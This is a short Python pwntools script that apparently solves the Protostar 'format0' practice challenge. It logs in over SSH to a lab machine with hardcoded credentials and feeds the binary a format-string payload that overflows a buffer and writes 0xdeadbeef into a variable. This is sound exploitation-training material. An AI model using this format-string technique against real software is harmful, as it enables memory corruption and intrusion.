#!/usr/bin/python3
from pwn import *
# you may need to change port for your machine
session = ssh(host='172.16.17.27', user='user', password='user', port=22)
# we overflow 64 characters %64d and then the address 0xdeadbeef is
# overwritten into the variable
io = session.run('bash', env={"PS1":""})
if(io):
    io.sendline('/opt/protostar/bin/format0 $(echo -ne "%64d\\xef\\xbe\\xad\\xde")')
    log.info(io.recvline(timeout=2).decode('utf-8'))
else:
    print("Error running sh")
session.close()
